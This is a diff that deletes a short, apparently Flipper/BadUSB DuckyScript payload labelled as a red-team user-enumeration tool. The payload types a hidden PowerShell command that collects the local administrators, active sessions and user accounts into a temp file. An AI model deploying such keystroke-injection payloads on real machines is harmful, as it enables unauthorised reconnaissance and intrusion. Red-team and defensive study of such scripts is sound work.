@@ -1,7 +1,0 @@
-REM CYBERFLIPPER - BASIC Level
-REM User Enumeration - Red Team OSINT
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -W Hidden -C "echo '=== USER ENUM ===' > $env:TEMP\users.txt; net localgroup administrators >> $env:TEMP\users.txt; qwinsta >> $env:TEMP\users.txt; net user >> $env:TEMP\users.txt; notepad $env:TEMP\users.txt"
-ENTER
